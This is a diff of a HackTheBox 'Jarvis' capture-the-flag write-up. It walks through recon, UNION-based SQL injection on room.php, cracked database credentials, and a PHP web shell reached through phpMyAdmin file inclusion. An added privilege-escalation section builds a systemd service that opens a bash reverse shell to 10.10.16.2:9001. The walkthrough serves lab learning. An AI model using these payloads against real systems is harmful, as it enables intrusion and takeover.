@@ -1,25 +1,23 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Jarvis
-# 15/3/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Linux |
+| Difficulty | Medium |
+
 10.10.10.143
 
-----------------------------------------------------
 # creds
-----------------------------------------------------
 DBadmin:imissyou
 
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.25 ((Debian))
 
-----------------------------------------------------
 # gobuster
-----------------------------------------------------
 /nav.php (Status: 200)
 /footer.php (Status: 200)
 /css (Status: 301)
@@ -38,9 +36,7 @@ I noticed clicking on one of the “Book Now” buttons leads to room.php,
 which takes a GET parameter: http://10.10.10.143/room.php?cod=1.
 
 
-----------------------------------------------------
 # sqli
-----------------------------------------------------
 List DBs	
 SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -
 Show Tables in hotel	
@@ -57,9 +53,7 @@ DBadmin
 2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
 MYSQL5 2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou
 
-----------------------------------------------------
-# exploitation
-----------------------------------------------------
+## Exploitation
 
 http://10.10.10.143/phpmyadmin/
 DBadmin:imissyou
@@ -79,6 +73,33 @@ Now it’s just a matter of getting some php code I want to run on the site. I c
 
 I’ll click on the “SQL” tab at the top, and enter the query:
 
-SELECT '<?php system($_GET["cmd"]);?>'
+SELECT ‘<?php system($_GET["cmd"]);?>’
 Now, I’ll include my php session info. I’ll check burp to grab my phpMyAdmin cookie, and visit: http://10.10.10.143/phpmyadmin/index.php?cmd=id&target=db_sql.php%3f/../../../../../var/lib/php/sessions/sess_e3qctegac4saf72rocbl1541j26u7mqm
 32pkjpcf63gkl0ko52n4m6b4d5
+
+## Privilege Escalation
+
+```bash
+sudo -l
+# (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpleHTTPPutServer.py
+```
+
+Command injection in the script to get shell as pepper, then:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+# /bin/systemctl has SUID
+```
+
+Create malicious service for root:
+
+```bash
+echo ‘[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.16.2/9001 0>&1"
+[Install]
+WantedBy=multi-user.target’ > /tmp/root.service
+
+systemctl link /tmp/root.service
+systemctl start root
+```
